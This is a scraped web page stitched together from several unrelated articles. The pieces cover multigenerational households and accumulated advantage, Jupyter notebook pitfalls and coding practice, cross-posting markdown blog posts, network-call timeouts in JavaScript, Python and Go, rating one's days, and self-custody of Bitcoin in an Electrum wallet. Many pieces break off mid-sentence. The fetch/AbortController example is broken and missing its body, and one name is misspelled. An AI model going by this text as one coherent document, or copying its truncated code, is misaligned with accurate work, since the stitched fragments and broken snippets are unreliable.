<p>Earning money earlier, saving earlier, building credit earlier, and learning earlier are all important choices that impact the ability for a person to accumulate advantage. The earlier you contribute to your intellectual and monetary principle, the greater the value of compounding you will receive over your lifetime. </p>



<p>Although there are complex child labor laws around the world, it may be important to adjust them for information age work. There is considerably less danger to a worker doing desk work than working in a factory. It is also becoming more common for <a href="https://influencermatchmaker.co.uk/blog/kid-influencers-meet-next-generation-social-media-stars">young people to take advantage of online opportunities.</a> </p>



<h2>The Challenge of Long Term Thinking In a Paycheck to Paycheck Environment</h2>



<p>But there is a simple and unavoidable truth: you can’t think too much about compounding interest if you’re trying to make ends meet. How are you going to keep the power on, where is the next meal going to come from, and how do you build up a rainy day fund? </p>



<p>In this situation, going to college and forgoing 4 years of income while adding $100,000 in debt is frequently not practical. Especially, if the individual doesn’t have an actionable plan for monetizing the college degree. The point is, if you don’t know what you want to do with your life then going to college can be a massive lifelong setback. </p>



<p>Instead, more people should consider operating from a multigenerational household to bypass traditional problems of living paycheck to paycheck. </p>



<h2>Accumulated Advantage Requires Repositioning Mindsets &amp; Value Systems</h2>



<p>But what does multigenerational living have to do with the Matthew effect? Looking on a globalized basis, it’s still true that most people would rather live today than 50 years ago. Despite that, there is still a sense that <a href="https://en.wikipedia.org/wiki/Matthew_effect">the Matthew Effect of Accumulated advantage</a> is <a href="https://www.npr.org/sections/parallels/2017/12/05/568288743/is-life-better-now-than-50-years-ago-the-answer-may-depend-on-the-economy#:~:text=%22There%20are%20countries%20which%2C%20if,years%20ago%2C%22%20says%20Poushter.&amp;text=Among%20U.S.%20respondents%2C%2037%20percent,percent%20said%20they%20are%20worse.">more pervasive in American and Western cultures</a>.  What might be the cause of this mindset variance?</p>



<p>America is still known as the land of opportunity but it’s also become an instant gratification culture. Anyone can make it big in their lifetime in America and for many cultures, this is a rarity. First time visitors still get that feeling of excitement when they visit New York City where anything feels possible.  </p>



<p>In contrast with Western individualistic mindsets, Asian cultures  have a pragmatic generational focus. Focusing on improving each subsequent generation as much as possible by increasing the following generations starting point. </p>



<p>Examples of this generational worldview are captured by <a href="https://www.fastcompany.com/90285552/the-most-powerful-person-in-silicon-valley">Softbanks, Mayoshi-Son</a> and his <a href="https://www.businessinsider.com/13-slides-softbanks-vision-for-next-300-years-2017-10#here-is-a-video-of-son-presenting-the-slides-15">300-year plan</a> and China’s strategic <a href="https://en.wikipedia.org/wiki/Belt_and_Road_Initiative">Belt and Road Initiative</a>. </p>



<p>Unlike much of Western culture, Asian culture still centers around multigenerational households. It’s typical that as many as 3 generations live under one roof on a consistent basis. <a href="https://www.theguardian.com/society/2019/mar/10/rise-of-multigenerational-family-living">This allows for the pooling of resources</a> and frequently prioritizes family goals over individual goals. </p>



<p>While multigenerational households have pros and cons they allow for effective generational planning.</p>



<h2>Multigenerational Homes Are Critical To Breaking The Cycle</h2>



<h3>Reduce and Share Costs</h3>



<p>So what are the traditionally disadvantaged to do? Take a page out of Asian culture by reducing costs and increasing resources while living communally in multigenerational homes. These homes provide resiliency to break the paycheck to paycheck cycle especially during challenging and unpredictable times like COVID-19. </p>



<p>As an example, shopping on a wholesale basis at the grocery store to get more food at lower cost.</p>



<h3>Increase Starting Principle</h3>



<p>Living in multigenerational homes supports increasing the families “principle” savings, creating safety nets and ultimately allowing for investment opportunities. Multiple generations of earners share the benefits of reduced costs of living and can stretch their resources farther.  It also permits communal savings with more frequent contributions of income. </p>



<p>By increasing the frequency of contribution to the families principle capital, the family position is able to accelerate the value of compounding growth over time. </p>



<p>The importance of compounding in both positive and negative directions is one of the most critical lessons needed to improve quality of life. It’s at the core principle of accumulating advantage or disadvantage and it impacts the velocity with which that phenomenon impacts a person’s life. </p>



<h3>Share Risks Across Multiple Incomes</h3>



<p>If you make a mistake in the direction of your life, you cost yourself time, money, and set yourself at a disadvantage to your peers ability to accumulate wealth faster than you.  </p>



<p>This is especially true as the transition from high school to college becomes a more questionable decision. Students now take on education debt, enter crowded job markets and are stuck with massive amounts of compounding debt. </p>



<p>A lack of understanding of compounding interest over time is a critical breakdown in the decision making process for students contemplating college. Skipping four years of full time earning and adding considerable debt for the privilege can have massive implications for expanding the class divide. </p>



<p>This is a major problem with our standardized education process. We have students go through high-school thinking that going straight to college is the best decision a person can make. Without considering the risk to capital accumulation.  We simply don’t teach them the financial literacy to make that decision from an informed point of view. </p>



<p>Despite these misgivings on whether college makes sense consider the following:</p>



<p>The individual contemplating $100,000 of debt vs the multigenerational family making an investment to increase a members earning power. The risk profiles are very different. Living with multiple generations also empowers individuals to approach higher education debt from a different financial position.</p>



<h2>Accumulated Advantage – The Takeaway </h2>



<p>Living together in multigenerational homes allows for the pooling of resources and reduction of costs. It allows for long term strategic planning to support asymmetric investments in new generations that would otherwise be impossible. By making these investments, families are adding to the principle achievements of …</p></div></div>

<p>If you’re into data science you’re probably familiar with this workflow: you start a project by firing up a jupyter
notebook, then begin writing your python code, running complex analyses, or even training a model. As the notebook file
grows in size with all the functions, the classes, the plots, and the logs, you find yourself with an enormous blob of
monolithic code sitting up in one place in front of you. If you’re lucky, things can go well. Good for you then!</p>
<p>However, jupyter notebooks hide some serious pitfalls that may turn your coding into a living hell. Let’s see how this
happens and then discuss coding best practices to prevent it.</p>
<h3 id="The-problems-with-Jupyter-Notebook-️"><a href="#The-problems-with-Jupyter-Notebook-%EF%B8%8F" aria-label="The problems with Jupyter Notebook ️ permalink"></a>The problems with Jupyter Notebook ⛔️</h3>

</p>
<p>Quite often, things may not go the way you intend if you want to take your jupyter prototyping to the next level. Here
are some situations I myself encountered while using this tool and that should sound familiar to you:</p>
<ul>
<li>With all the objects (functions or classes) defined and instantiated in one place, <strong>maintainability becomes really
hard:</strong> even if you want to make a small change to a function, you have to locate it somewhere in the notebook, fix it
and rerun the code all over again. You don’t want that, believe me. Wouldn’t be simple to have your logic and
processing functions separated in external scripts?</li>
<li>Because of its interactivity and instant feedback, jupyter notebooks push data scientists to declare variables in the
global namespace instead of using functions. This is considered
<a href="https://stackoverflow.com/questions/19158339/why-are-global-variables-evil/19158418#19158418">bad practice</a> in python
development because <strong>it limits effective code reuse</strong> . It also harms reproducibility because your notebook turns
into a large state machine holding all your variables. In this configuration, you’ll have to remember which result is
cached and which is not and you’ll also have to expect other users to follow your cell execution order.</li>
<li>
<p>The way notebooks are formatted behind the scenes (JSON objects) makes <strong>code versioning difficult</strong>. This is why I
rarely see data scientists using GIT to commit different versions of a notebook or merging branches for specific
features. Consequently, team collaboration becomes inefficient and clunky: team members start exchanging code snippets
and notebooks via e-mail or Slack, rolling back to a previous version of the code is a nightmare, and the file
organization starts to be messy. Here’s what I commonly see in projects after two or three weeks of using a jupyter
notebook without proper versioning:</p>
<p><strong>analysis.ipynb</strong></p>
<p><strong>analysis_COPY(1).ipynb</strong></p>
<p><strong>analysis_COPY(2).ipynb</strong></p>
<p><strong>analysis_FINAL.ipynb</strong></p>
<p><strong>analysis_FINAL2.ipynb</strong></p>
</li>
<li>Jupyter notebooks are good for exploration and quick prototyping. They’re certainly <strong>not designed for reusability or
production-use.</strong> If you developed a data processing pipeline using a jupyter notebook, the best you can state is that
your code is only working on your laptop or your VM in a linear synchronous fashion following the execution order of
the cells. This doesn’t say anything about the way your code would behave in a more complex environment with, for
instance, larger input datasets, other asynchronous parallel tasks, or less allocated resources. Notebooks are in fact
hard to test since their behavior is sometimes unpredictable.</li>
<li>As someone who spends most of his time on VSCode taking advantage of powerful extensions for code
<a href="https://marketplace.visualstudio.com/items?itemName=ms-python.python">linting</a>, style
<a href="https://prettier.io/">formatting</a>, code structuring, autocompletion, and codebase search, I can’t help but feel a bit
powerless when switching back to jupyter. <strong>Compared to VSCode, jupyter notebook lacks extensions that enforce coding
best practices.</strong></li>
</ul>
<p>Ok folks, enough bashing for now. I honestly love jupyter and I think it’s great for what’s designed to do. You can
definitely use it to bootstrap small projects or quickly prototype ideas.</p>
<p>But in order to ship these ideas in an industrial fashion, you have to follow software engineering principles that
happen to get lost when data scientists use notebooks. So let’s review some of them together and see why they’re
important.</p>

<p>One of the most important aspects of code quality is clarity. Clear and readable code is crucial for collaboration and
maintainability.</p>
<p>Here’s what may help you have a cleaner code:</p>
<ul>
<li>
<p><strong>Use meaningful variable names</strong> that are descriptive and imply type. For example, if you’re declaring a boolean
variable about an attribute (age for example) to check whether a person is old, you can make it both descriptive and
type-informative by using <strong>is_old</strong>.</p>
<p>The same goes for the way you declare your data: make it explanatory.</p>
</li>
</ul>
<div data-language="python"><pre><code>
<span>import</span> pandas <span>as</span> pd
df <span>=</span> pd<span>.</span>read_csv<span>(</span>path<span>)</span>

transactions <span>=</span> pd<span>.</span>read_csv<span>(</span>path<span>)</span></code></pre></div>
<ul>
<li><strong>Avoid abbreviations</strong> that no one but you can understand and <strong>long variable names</strong> that no one can bear.</li>
<li><strong>Don’t hard code “magic numbers” directly in code</strong>. Define them in a variable so that everyone can understand what
they refer to.</li>
</ul>
<div data-language="python"><pre><code>
optimizer <span>=</span> SGD<span>(</span><span>0.0045</span><span>,</span> momentum<span>=</span><span>True</span><span>)</span>

learning_rate <span>=</span> <span>0.0045</span>
optimizer <span>=</span> SGD<span>(</span>learning_rate<span>,</span> momentum<span>=</span><span>True</span><span>)</span></code></pre></div>
<ul>
<li><strong>Follow PEP8 conventions</strong> when naming your objects: for example, functions and methods names are in lowercase and
words are separated by an underscore, class names follow the UpperCaseCamelCase convention, constants are fully
capitalized, etc. Learn more about these conventions
<a href="https://visualgit.readthedocs.io/en/latest/pages/naming_convention.html">here</a>.</li>
<li><strong>Use indentation and whitespaces</strong> to let your code breathe. There are standard conventions such as “using 4 space
for each indent”, “separate sections should have additional blank lines”… Since I never remember those, I use a very
nice <strong>VSCode extension called <a href="https://prettier.io/">prettier</a> that automatically reformat my code</strong> when pressing
ctrl+s.</li>
</ul>

<h4 id="2--Make-your-code-modular-"><a href="#2--Make-your-code-modular-" aria-label="2  Make your code modular  permalink"></a>2 — Make your code modular 📁</h4>
<p>When you start building something that you feel can be reused in the same or other projects, you’ll have to organize
your code into logical functions and modules. This helps for better organization and maintainability.</p>
<p>For example, you’re working on an NLP project and you may have different processing functions to handle text data
(tokenizing, stripping URLs, lemmatizing, etc.). You can put all these units in a python module called
text_processing.py and import them from it. Your main program will be way lighter!</p>
<p>These are some good tips I learned about writing modular code:</p>
<ul>
<li><strong>DRY: Don’t Repeat Yourself.</strong> Generalize and consolidate your code whenever possible.</li>
<li><strong>Functions should do one thing.</strong> If a function does multiple operations, it becomes more difficult to generalize.</li>
<li><strong>Abstract your logic in functions but without over-engineering it</strong>: there’s the slight possibility that you’ll end
up with too many modules. Use your judgment, and if you’re inexperienced, have a look at popular GitHub repositories
such as <a href="https://github.com/scikit-learn/scikit-learn">scikit-learn</a> and check out their coding style.</li>
</ul>
<h4 id="3--Refactor-your-code-"><a href="#3--Refactor-your-code-" aria-label="3  Refactor your code  permalink"></a>3 — Refactor your code 📦</h4>
<p>Refactoring aims at reorganizing the internal structure of the code without altering its functionalities. It’s usually
done on a working (but still not fully organized) version of the code. It helps de-duplicate functions, reorganize the
file structure, and add more abstraction.</p>

<p>Writing efficient code that executes fast and consumes less memory and storage is another important skill in software
development.</p>
<p>Writing efficient code takes years of experience, but here are some quick tips that may help your find out if your code
is running slow and how to boost it:</p>
<ul>
<li>Before running anything, check the complexity of your algorithm to evaluate its execution time</li>
<li>Check the possible bottlenecks of your script by inspecting the running time of every operation</li>
<li>Avoid for-loops as much as possible and vectorize your operations, especially if you’re using libraries such as
<a href="https://numpy.org/">NumPy</a> or <a href="https://pandas.pydata.org/">pandas</a></li>
<li>Leverage the CPU cores of your machine by using multiprocessing</li>

<p>In my personal experience, using GIT + Github helped me improve my coding skills and better organize my projects. Since
I used it while collaborating with friends and/or colleagues, it made me stick to standards I didn’t obey to in the
past.</p>

<p>There are lots of benefits to using a version control system, be it in data science or software development.</p>
<ul>
<li>Keeping track of your changes</li>
<li>Rolling back to any previous version of the code</li>
<li>Efficient collaboration between team members via merge and pull requests</li>
<li>Increase of code quality</li>
<li>Code review</li>
<li>Assigning tasks to team members and monitoring their progress over time</li>
</ul>
<p>Platforms such as Github or Gitlab go even further and provide, among other things, Continuous Integration and
Continuous Delivery hooks to automatically build and deploy your projects.</p>

what it’s designed to do, is to write <strong>tests</strong> that check an expected behavior.</p>
<p>Tests can be as simple as checking an output shape or an expected value returned by a function.</p>

          <p>This is your <em>Ultimate Guide</em> that proposes a solution to write your blog in markdown and to cross post it to different platforms. Here you will find tips on how to set up your IWE (Integrated Writer's Environment) and even a few goodies on marketing as well as on content creation.</p>
          <p>I warn you, this is a monstrous piece of content, so here's the rough outline:</p>
          <ol>
            <li>Some cross posting, SEO &amp; hosting theory</li>
            <li>Markdown writing tips (Integrated Writer Environment)</li>
            <li>Content distribution <br> GitHub <br> Webflow <br> dev.to <br> Medium <br> codementor
            </li>
          </ol>
          <p>By the way, the original title of this post was:</p>
          <h2 id="the-perfect-setup-to-write-your-software-developer-blog-content-in-markdown-and-crosspost-it-to-webflow-devto-github-medium--codementor">The Perfect Setup to Write your Software Developer Blog Content in Markdown and CrossPost it to Webflow, dev.to, GitHub, Medium &amp; codementor</h2>
          <p>However, this one was a bit over the <a href="https://www.mheroes.com/that-blog-title-is-too-long-are-you-counting/">recommended 60 max. chars</a> for blog titles…</p>
          <p>From this longer title, you'll see that this post will be of special interest to you if you use webflow to host your blog.</p>
          <p><strong>And</strong> if you have some sort of a software developer or technical blog content since we go deeply into things like code syntax highlighting proper hosting, and developer-focused content platforms.</p>
          <p><strong>Or</strong> maybe you just ❤️ markdown?</p>
          <p><strong>Or</strong> you'd like to open source your blog on GitHub too?</p>
          <p>By the way, I just always wanted to write that something's an <em>"Ultimate Guide"</em>, but actually, it's just a bunch of paragraphs. It will be probably an eternal WIP, considering all the platforms and different tastes involved. If you are a happy person, i.e. you are reading this on its original place of spawning (<a href="https://fullstack.coach/post/how-to-write-and-cross-post-your-markdown-content">fullstack.coach</a>) or in the post's very core root on <a href="https://github.com/RichStone/content/blob/content/fullstack.coach/write-markdown-distribute-everywhere.md">Github</a> (YOU NERD!) or on dev.to, then you will always have the most up to date version of it. Congrats!🎉</p>
          <blockquote>
            <p>In case you start to wonder now: This article is published on all the mentioned platforms with as much automation as currently possible. The original article was published on <a href="https://fullstack.coach/post/how-to-write-and-cross-post-your-markdown-content">fullstack.coach</a> and then a few days later, after Google has done its dirty indexing stuff, on all the other platforms including some best practices and canonical URLs. Here you will find out how in fullest of detail!</p>
          </blockquote>
          <h2 id="why-cross-post-your-content-at-all">Why cross post your content at all</h2>
          <p>If you are in the beginning with your blog, writing can feel lonely. Especially if you took the hard route and decided to self-host your blog, as opposed to using a blogging platform like dev.to or Medium, you will lack essential engagement and feedback which are crucial to nurturing your writing and motivation. Additionally, potential readers won't ever get to know about the useful things you are talking about :/</p>
          <p>This is why I propose to go out there and make your content as visible as possible on different platforms, especially in the beginning.</p>
          <p>But how do you keep your posts <strong>consistent on the different platforms</strong>? What if you have a badass blog post that you want to <strong>extend or update over time</strong>? What if you want to make your blog <strong>open source</strong> so that your content becomes a community effort? How do you keep SEO happy? And probably the most important question, how do you keep your <strong>writing in the beloved markdown</strong>??</p>
          <h2 id="enter-crosspost-🔮">Enter CrossPost 🔮</h2>
          <p>CrossPost is a tool that I wrote on some occasional free time slots. Like a magic ball, it's intended to mystically solve some of the issues above. At the moment, it has great capabilities to let you write markdown in your favorite editor and then (almost) automatically publish your articles on webflow as well as dev.to.</p>
          <p>Medium and codementor don't have public APIs for publishing articles but I will outline how to make your life easier if you decide to go the extra mile to publish there too. In the end, you can't be sure where your best audience will be unless you try them all out.</p>
          <p>I am open to integrating new platforms with CrossPost or describing them here in more depth, feel free to suggest anything or fire up a pull request!</p>
          <h2 id="theoretical-prerequisites">Theoretical Prerequisites</h2>
          <p>Let's talk some serious stuff first so that we have a common standpoint when we speak about systematic cross-posting.</p>
          <h3 id="content-consistency">content consistency</h3>
          <p>Unless you are a daily news agency, you'll probably want to write so-called pillar content. That is to say, content that stays relevant over long periods. This type of content, your guides and tutorials and evergreen stories, sometimes, needs updates and upgrades!</p>
          <p>That's very painful if you always have to do it manually on all platforms. Those magic platforms that offer a public API are the good guys who give you the possibility to automate your content updates.</p>
          <h3 id="canonical-urls">canonical URLs</h3>
          <p>Google &amp; Co. do not like the same content on different platforms and hosts. The canonical URL is one way to tell Google the original source of the content. You set it once, e.g. in the head of the HTML page where your duplicate content lives and everyone's happy:</p>
          <pre><code>&lt;link rel="canonical" href="https://fullstack.coach/" /&gt;</code></pre>
          <p>But I guess Google will be able to <a href="https://support.google.com/webmasters/answer/139066?hl=en&amp;ref_topic=6080547">explain it in more detail</a>.</p>
          <h3 id="self-hosting-a-blog">self-hosting a blog</h3>
          <p>With self-hosting, I don't mean you need to deploy your blog on a Linux server. I mean owning your content more than you would do at dev.to or Medium.</p>
          <p>You own your content more, as soon as you use a platform that allows you to provide additional content in other formats that could interest your readers and if you can place a newsletter subscription somewhere.</p>
          <p>Ultimately, if you "own" your content space, at least for a bit, you'll be able to turn on some ads in case you become a traffic magnet at some point (although I wouldn't go with anything else than a trusted platform like <a href="https://www.carbonads.net/">carbonads</a>, especially with a developer blog).</p>
          <p>You might find dev.to, Medium and codementor handy now but you won't be able to do any of the above with them later.</p>
          <p>In this context, we can consider platforms like WordPress already self-hosted, because you own it enough. I can't cope with the plugin environment of WordPress which is also the reason why I actively advise for a <a href="https://www.alioned.com/post/webflow-for-developers-my-personal-experience-building-our-agency-website-on-webflow">developer-friendly alternative that I use myself</a>: Webflow (<a href="https://webflow.com/?rfsn=4246649.252ab0&amp;utm_medium=affiliate">affiliate 🤩 link</a>).</p>
          <blockquote>
            <p>Congratulations 🎉 We've learned a ton about what I think I understand about some blog marketing topics, so now it's time for dirty hands-on work.</p>
          </blockquote>
          <h2 id="iwe---integrated-writer-environment">IWE - Integrated Writer Environment</h2>
          <p>Every piece of art starts with an atelier or workshop. This is how my optimal writer atelier looks like:</p>
          <ol>
            <li>as distraction-free as possible</li>
            <li>… but simultaneously supportive with grammar and style</li>
            <li>markdown-friendly</li>
            <li>format-friendly</li>
          </ol>
          <p>Writing directly in Grammarly will probably make you the Hemingway of developer blogs, but actually, it won't. I find it very destructive when the all-knowing and all-mighty Grammarly is throwing grammar and orthography errors at me on every third word that I'm bringing to life…</p>
          <p>It's not a secret that especially the first draft should be written in some kind of flow that reflects your own thoughts and style. That's why my writing and editing routine looks something like this:</p>
          <ol>
            <li>write the <a href="http://www.debbiereberwritingcoach.com/the-art-of-the-shitty-first-draft-why-and-how-to-write-it-2/">shitty first draft</a> in VSCode<br> Completely distraction-free</li>
            <li>full proof-read and edit not earlier as the next day<br> Now, turn on the Grammarly plugin inside VSCode</li>
            <li>Another edit sometime later on the target platform<br> You'll have another fresh look at the final format of your writing</li>
          </ol>
          <p>Checking your spelling and grammar with Grammarly can be tricky, especially if you are writing in rich text formats since copy/pasting <del>can</del> will mess up your format.</p>
          <p>The Grammarly app seems to work fine with copy-pasting markdown. But there is also a plugin for VSCode so that you don't have to leave your editor ever 🤓. You've got to be a bit patient with this plugin sometimes, though. Try it out!</p>
          <p>You will also install the markdownlint plugin so that you are always kept up to date about any issues you introduce to your beautiful markdown files by chaotically typing things.</p>
          <p><img src="https://raw.githubusercontent.com/RichStone/content/0d2fd292c648ab85c7504ab08ba4574cf67d4450/fullstack.coach/images/write-markdown-distribute-everywhere/typing-cat.gif" alt="typing cat gif"></p>
          <p>A super cool feature of blogging in VSCode with markdownlint are links and images.</p>
          <p>I would hate to interrupt… (Wow that's scary, as I wrote the word "interrupt" my wife called to ask me about whether I've bought some corn 🌽) …interrupt the writing flow to search for some links or to upload some images into the cloud. You can just write your markdown like this in markdown:</p>
          <pre><code>Never know where that damn ([affiliate 🤩 link]() is,
so, I just procrastinate with it, until the final edit.

Sometimes, I also don't like adding pictures on the fly,
especially if I have to upload them first, so,
in all agility, I do this:

IMAGE TITLE - markdownlint does not appreciate this:
![]()</code></pre>
          <p>So that in the end, it looks something like this:</p>
          <p><img src="https://github.com/RichStone/content/blob/content/fullstack.coach/images/write-markdown-distribute-everywhere/MARKDOWNLINT%20VALIDATION.png?raw=true" alt="markdownlint validation example"></p>
          <p>This is impossible to miss on your final edit, no matter how late or early it is that I'm writing this stuff (and yeah, I missed lots of them in the past). It's a fail-safe system :troll: (even better: For the next version of CrossPost, I plan an automation where you will only need to add the local path to VSCode. WIN-WIN.)</p>
          <p>Or even better, use some HTML in your markdown, like: <code>&lt;img alt="I'll add this picture after the 'holidays'🤭"&gt;</code>. If you ever publish your content before the holidays, there will be the classic broken picture image with your alt description.</p>
          <p>Take whatever you prefer.</p>
          <p>Another thing I like is the 80 character max limit for my writing in markdown but I need the process automated. I tried the VSCode Rewrap plugin, but it created some weird newlines that were displayed in dev.to and webflow in an ugly way. So for now, I'm OK writing everything strung together. VSCode's soft wrap still lets me write and watch the content conveniently.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><header><p>May 03, 2020</p></header><p>Modern applications don’t crash; they hang. One of the main reasons for it is the assumption that the network is reliable. It isn’t. </p><p>When you make a network call without setting a timeout, you are telling your code that you are 100% confident that the call is going to succeed. Would you really take that bet?</p><p>If you are a making synchronous network call that never returns, then to very least your thread hogs forever. Whoops. Asynchronous network calls that don’t return are not free either. Sure, you are not hogging threads, but you are leaking sockets. Any HTTP client library worth its salt uses socket pools to <a href="https://en.wikipedia.org/wiki/HTTP_persistent_connection">avoid recreating connections</a>. And those pools have a limited capacity. Like any other resource leak, it’s only a matter of time until there are no sockets left. When that happens, your application is going to get stuck waiting for a connection to free up.</p><p>If the network is not reliable, why do we keep creating APIs that have infinity as the default timeout? Some APIs don’t even have a way to set a timeout in the first place! A good API should be easy to use the right way and hard to use the wrong way. When the default timeout is infinity, it’s all too easy for a client to shoot itself in the foot. </p><p>If you remember one thing from this post, then let it be this: <strong>never use “infinity” as a default timeout</strong>.</p><p>Let’s take a look at some concrete examples.</p><p>Javascript’s XMLHttpRequest is THE web API to retrieve data from a server asynchronously. Its <a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/timeout">default timeout is zero</a>, which means there is no timeout!</p><div data-language="javascript"><pre><code><span>var</span> xhr <span>=</span> <span>new</span> <span>XMLHttpRequest</span><span>(</span><span>)</span><span>;</span>
xhr<span>.</span><span>open</span><span>(</span><span>'GET'</span><span>,</span> <span>'/api'</span><span>,</span> <span>true</span><span>)</span><span>;</span>


xhr<span>.</span>timeout <span>=</span> <span>10000</span><span>;</span> 

xhr<span>.</span><span>onload</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
 
<span>}</span><span>;</span>

xhr<span>.</span><span>ontimeout</span> <span>=</span> <span>function</span> <span>(</span><span>e</span><span>)</span> <span>{</span>
 
<span>}</span><span>;</span>

xhr<span>.</span><span>send</span><span>(</span><span>null</span><span>)</span><span>;</span>
</code></pre></div><p>Client-side timeouts are as crucial as server-side ones. There is a <a href="https://hpbn.co/primer-on-browser-networking/#connection-management-and-optimization">maximum number of sockets your browser</a> can open for a particular host. If you make network requests that never returns, you are going to exhaust the socket pool. When the pool is exhausted, you are no longer able to connect to the host. </p><p>The fetch web API is a modern replacement for the XMLHttpRequest API, which uses Promises. When the API was initially introduced, there was <a href="https://github.com/whatwg/fetch/issues/951">no way to set a timeout at all</a>! Browsers have recently added experimental support for the <a href="https://developer.mozilla.org/en-US/docs/Web/API/AbortController">Abort API</a> to support timeouts, though.</p><div data-language="javascript"><pre><code><span>const</span> controller <span>=</span> <span>new</span> <span>AbortController</span><span>(</span><span>)</span><span>;</span>

<span>const</span> signal <span>=</span> controller<span>.</span>signal<span>;</span>

<span>}</span><span>)</span>
</code></pre></div><p>Things aren’t much rosier in Python-land. The requests library uses a default timeout of <a href="https://requests.readthedocs.io/en/master/user/quickstart/#timeouts">infinity</a>. </p><div data-language="python"><pre><code>
response <span>=</span> requests<span>.</span>get<span>(</span><span>'https://github.com/'</span><span>,</span> timeout<span>=</span><span>10</span><span>)</span></code></pre></div><p>What about Go? Go’s HTTP package <a href="https://github.com/golang/go/issues/24138">doesn’t use timeouts</a> by default either. </p><div data-language="go"><pre><code><span>var</span> client <span>=</span> <span>&amp;</span>http<span>.</span>Client<span>{</span>
  
  Timeout<span>:</span> time<span>.</span>Second <span>*</span> <span>10</span><span>,</span> 
<span>}</span>

response<span>,</span> <span>_</span> <span>:=</span> client <span>.</span><span>Get</span><span>(</span>url<span>)</span></code></pre></div><p>Modern HTTP clients for Java and .NET do a much better job and usually, come with default timeouts. For example, .Net Core’s HttpClient has a default timeout of <a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.http.httpclient.timeout?view=netcore-3.1#remarks">100 seconds</a>. It’s lax but much better than no timeout at all. That comes as no surprise since those languages are used to build large scale distributed systems that need to be robust against network failures. Network requests without timeouts are the <a href="https://en.wikipedia.org/wiki/Fallacies_of_distributed_computing">top silent killer</a> of distributed systems.</p><h3 id="remember-this"><a href="#remember-this" aria-label="remember this permalink"></a>Remember this</h3><p>As a rule of thumb, always set timeouts when making network calls. And if you build libraries, always set reasonable default timeouts and make them configurable for your clients.</p><p>Do you want to learn more about stability patterns and anti-patterns of distributed systems?

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            

            <p>
            Over the past few months I've been rating my days every evening from 0 to 10 by answering the following question: <strong>Was it a good day</strong>? The definition of a good day varies for everyone, but for me one important aspect of it is being <strong>proud of myself</strong>. Particularly having had the discipline to tackle important tasks and resist the temptation of destructive instant-gratification.

            </p>

            <p>
            Reviewing my days led me to some insights about what makes me feel proud of myself or not. This is what I've found so far, from most beneficial to most detrimental:
            </p>

            <ul>
              <li>⭐⭐⭐: Making progress on a personal project (code, music, blogging...)</li>
              <li>⭐⭐⭐: Making progress on professional work</li>
              <li>⭐⭐⭐: Getting important or stressful tasks done</li>
              <li>⭐⭐: Having a healthy day (fitness, nutrition)</li>
              <li>⭐: Getting unimportant tasks or chores done</li>
              <li>💣: Letting my apartment get messy</li>
              <li>💣💣: Eating unhealthy comfort food</li>
              <li>💣💣: Letting more tasks or chores pile up</li>
              <li>💣💣💣: Using my phone for a long time (Reddit, YouTube) - okay when eating</li>
            </ul>

            <p>
            In particular, I feel amazing when I reach <strong>todo zero</strong> and <strong>inbox zero</strong> (no tasks left to do except personal projects), and I feel terrible when I am completely overwhelmed by a lot of tasks (30+). Basically, in order to maintain a baseline of daily happiness, I must have the discipline to at least make some progress on personal or professional work every day, and maintain my todo list to a low manageable amount of tasks.
            </p>

            <p>
            Of course life is not only about productivity and discipline. The second important aspect of a good day to me is <strong>doing enjoyable activities</strong>, as long as they are more enjoyable than destructive. Like everything, it's all about balance. Having occasional beers with a friend is more enjoyable and memorable than it is destructive, so that's fine. An unproductive day filled with quality enjoyable activities can be a great day.
            </p>

            <p>
            Things that always make my day better include:
            </p>
            <p>
            ⭐⭐⭐⭐: Spending quality time with my girlfriend, friends and family, listening to happy music, going out for a big walk, or chilling in a park.
            </p>

            <p>
            What is a good day to you?
            </p>

.</p><p>This is the first post in a series to reclaim your <em>privacy</em>, <em>autonomy</em>, <em>sovereignity</em> and <em>independence</em> of your coins. The setup I will describe will allow you to connect to your Electrum wallet from any supported Electrum clients (Win/OSX/Linux/Android at the time of writing) through a secure and private connection, remotely.</p><h2 id="why-have-your-own-wallet">Why have your own wallet? <a arial-abel="header-anchor" href="#why-have-your-own-wallet">#</a></h2><blockquote><p>“Not your keys, not your coins” - Andreas M. Antonopoulos</p></blockquote><h3 id="security">Security <a arial-abel="header-anchor" href="#security">#</a></h3><p>Exchanges don’t actually allow you to see your keys (a <code>seed phrase</code> phrase being one form of key combination). Whenever you use your exchange to transfer funds (or store them) you are relying on them to keep it safe. This means your coins <strong>are not in your custody and belong to the exchange</strong>.</p><p>Now, you might say, an exchange <em>probably</em> has better security than I ever will, therefore it’s safer to just let their engineers take care of it. Well, as it turns out exchanges being hacked is <a href="https://en.wikipedia.org/wiki/Mt._Gox" rel="noopener noreferrer" target="_blank">quite</a>

going? Anyways, you get the point.</p><p>Besides external risks, the actual exchange company owners have the keys to your keys and have every incentive to get them. Also if an investigation into an exchange gets launched, <a href="https://www.ccn.com/south-koreas-biggest-cryptocurrency-exchange-investigated-by-local-police-market-drops/" rel="noopener noreferrer" target="_blank">your funds might get frozen</a>
.</p><h3 id="privacy">Privacy <a arial-abel="header-anchor" href="#privacy">#</a></h3><p>Every single exchange that is not p2p (e.g. <a href="https://bisq.network/" rel="noopener noreferrer" target="_blank">Bisq</a>
, locally acquiring coins) has <a href="https://en.wikipedia.org/wiki/Know_your_customer" rel="noopener noreferrer" target="_blank">KYC</a>
/<a href="https://www.investopedia.com/terms/a/aml.asp" rel="noopener noreferrer" target="_blank">AML</a>
requirements, by law. Not only that, chain analysis companies and software <a href="https://en.wikipedia.org/wiki/Blockchain_analysis" rel="noopener noreferrer" target="_blank">are a real thing</a>
. If you keep your funds in your exchange wallet, you have no hope of ever anonymizing your Bitcoin (we’ll get to that later). This is also why <strong>DEFI</strong> (decentralized finance) could be so revolutionary and why decentralized exchanges should be used if your aim is privacy.</p><blockquote><p>In Bisq there’s currently not much liquidity, so expect to lose a bit of coins (<code>~2-5%</code> at the time of writing).</p></blockquote><h3 id="flexibility">Flexibility <a arial-abel="header-anchor" href="#flexibility">#</a></h3><p>Having your own wallet not only gives you more privacy and security, but can also gives you more options. For example the <a href="https://wasabiwallet.io/" rel="noopener noreferrer" target="_blank">Wasabi wallet</a>
